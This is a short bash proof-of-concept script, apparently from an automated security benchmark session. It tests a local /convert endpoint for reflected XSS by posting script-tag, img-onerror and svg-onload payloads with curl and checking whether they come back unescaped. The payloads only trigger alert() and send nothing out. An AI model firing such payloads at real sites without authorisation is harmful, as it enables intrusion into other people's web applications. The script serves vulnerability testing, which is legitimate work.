#!/bin/bash
# POC: Demonstrates reflected XSS vulnerability in /convert endpoint through markdown_text parameter with multiple payload types
# Target: ./repo
# Created: 2025-11-04T20:06:18.320Z
# Session: benchmark-XBEN-033-24-mhkzvt57

# Reflected XSS POC for /convert endpoint markdown_text parameter
# Tests multiple XSS vectors to confirm the vulnerability

TARGET="${1:-http://localhost:8080}"
ENDPOINT="/convert"
URL="${TARGET}${ENDPOINT}"

echo "[*] Testing Reflected XSS in markdown_text parameter"
echo "[*] Target: $URL"
echo ""

# Test 1: Simple script tag injection
echo "[TEST 1] Script tag injection:"
PAYLOAD='<script>alert(1)</script>'
RESPONSE=$(curl -s -X POST "$URL" -d "markdown_text=$PAYLOAD" -H "Content-Type: application/x-www-form-urlencoded")
if echo "$RESPONSE" | grep -q '<script>alert(1)</script>'; then
    echo "✓ VULNERABLE: Script tag not escaped"
    echo "  Payload: $PAYLOAD"
    echo "  Response snippet: $(echo $RESPONSE | grep -o '<script>alert(1)</script>')"
else
    echo "✗ SAFE: Script tag was escaped/sanitized"
fi
echo ""

# Test 2: img tag with onerror handler
echo "[TEST 2] IMG onerror handler injection:"
PAYLOAD='<img src=x onerror=alert(document.domain)>'
RESPONSE=$(curl -s -X POST "$URL" -d "markdown_text=$PAYLOAD" -H "Content-Type: application/x-www-form-urlencoded")
if echo "$RESPONSE" | grep -qE '<img[^>]*onerror'; then
    echo "✓ VULNERABLE: IMG onerror not escaped"
    echo "  Payload: $PAYLOAD"
    echo "  Response contains img with onerror handler"
else
    echo "✗ SAFE: IMG onerror was escaped/sanitized"
fi
echo ""

# Test 3: SVG onload handler
echo "[TEST 3] SVG onload handler injection:"
PAYLOAD='<svg onload=alert("XSS")>'
RESPONSE=$(curl -s -X POST "$URL" -d "markdown_text=$PAYLOAD" -H "Content-Type: application/x-www-form-urlencoded")
if echo "$RESPONSE" | grep -qE '<svg[^>]*onload'; then
    echo "✓ VULNERABLE: SVG onload not escaped"
    echo "  Payload: $PAYLOAD"
    echo "  Response contains svg with onload handler"
else
    echo "✗ SAFE: SVG onload was escaped/sanitized"
fi
echo ""

# Test 4: HTML escape test - if properly escaped, should contain &lt; and &gt;
echo "[TEST 4] Checking for proper HTML escaping:"
PAYLOAD='<script>alert(1)</script>'
RESPONSE=$(curl -s -X POST "$URL" -d "markdown_text=$PAYLOAD" -H "Content-Type: application/x-www-form-urlencoded")
if echo "$RESPONSE" | grep -qE '(&lt;|&gt;|&#|&amp;)'; then
    echo "✓ SAFE: HTML appears to be escaped"
    echo "  Response contains HTML entities"
else
    if echo "$RESPONSE" | grep -q '<script>'; then
        echo "✗ VULNERABLE: Script tag present unescaped - XSS confirmed"
    fi
fi
echo ""

# Test 5: Full response analysis
echo "[TEST 5] Full Response Analysis:"
echo "Response (first 500 chars):"
echo "$RESPONSE" | head -c 500
echo ""
echo ""
echo "[*] POC Complete"